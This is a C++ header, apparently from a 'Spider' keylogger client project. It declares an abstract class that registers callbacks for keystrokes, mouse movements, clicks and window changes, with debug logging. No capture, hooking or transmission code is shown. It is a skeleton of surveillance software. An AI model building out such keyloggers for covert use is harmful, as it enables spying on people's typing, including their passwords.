//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_KEYLOGGER_HPP
#define SPIDER_CLIENT_KEYLOGGER_HPP

#include <utility>
#include <memory>
#include <log/Logger.hpp>
#include <Protocol/Messages.hpp>

namespace spi
{
    class KeyLogger
    {
    public:
        using MouseMoveCallback = std::function<void(spi::proto::MouseMove &&)>;
        using KeyPressCallback = std::function<void(spi::proto::KeyEvent &&)>;
        using MouseClickCallback = std::function<void(spi::proto::MouseClick &&)>;
        using WindowChangeCallback = std::function<void(spi::proto::WindowChanged &&)>;
        virtual bool setup() noexcept = 0;
        virtual void run() = 0;
        virtual void stop() = 0;

    public:
        void onMouseMoveEvent(MouseMoveCallback &&callback) noexcept
        {
            _mouseMoveCallback = std::move(callback);
            _log(logging::Debug) << "Registered callback for " << utils::Green << "MouseMove"
                                 << utils::Reset << " events" << std::endl;
        }

        void onMouseClickEvent(MouseClickCallback &&callback) noexcept
        {
            _mouseClickCallback = std::move(callback);
            _log(logging::Debug) << "Registered callback for " << utils::Green << "MouseClick"
                                 << utils::Reset << " events" << std::endl;
        }

        void onKeyboardEvent(KeyPressCallback &&callback) noexcept
        {
            _keyPressCallback = std::move(callback);
            _log(logging::Debug) << "Registered callback for " << utils::Green << "KeyboardEvent"
                                 << utils::Reset << " events" << std::endl;
        }

        void onWindowChangeEvent(WindowChangeCallback &&callback) noexcept
        {
            _windowChangeCallback = std::move(callback);
            _log(logging::Debug) << "Registered callback for " << utils::Green << "WindowChangeEvent"
                                 << utils::Reset << " events" << std::endl;
        }

        virtual ~KeyLogger() noexcept = default;

    protected:
        logging::Logger _log{"keylogger", logging::Level::Debug};
        MouseMoveCallback _mouseMoveCallback;
        MouseClickCallback _mouseClickCallback;
        KeyPressCallback _keyPressCallback;
        WindowChangeCallback _windowChangeCallback;
    };

    using KeyLogPtr = std::unique_ptr<KeyLogger>;
}

#endif //SPIDER_CLIENT_KEYLOGGER_HPP
